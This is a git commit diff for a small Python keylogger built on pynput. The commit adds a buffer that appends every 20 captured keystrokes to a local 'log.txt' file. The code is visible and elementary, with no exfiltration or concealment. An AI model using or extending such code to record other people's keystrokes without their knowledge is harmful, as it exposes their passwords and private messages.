6a53cddc21516b76602d56201b94e7a0cd2231be
Abdul Salam Khan <kabdulsalam6@gmail.com>
2019-04-24 04:25:30 -0700

    added the functionality of writing the keys pressed in a text file

--- keylog.py
+++ keylog.py
@@ -1,15 +1,31 @@
 import pynput
 from pynput.keyboard import Key, Listener
 
-def on_press(key):
-    print('key {0} is pressed'.format(key))
+count = 0
+keys = []
 
+def on_press(key):
+	global count, keys
+	
+	keys.append(key)
+	count += 1
+	print('key {0} is pressed'.format(key))
+
+	if count>=20:
+		count = 0
+		write_file(keys)
+		keys = []
+
+def write_file(keys):
+	with open("log.txt", "a") as f:
+		for key in keys:
+			f.write(str(key))
+			
 def on_release(key):
-    if key == Key.esc:
+	if key == Key.esc:
         # Stop listener
-        return False
+		return False
 
 # Collect events until released
 with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
-          
+	listener.join()
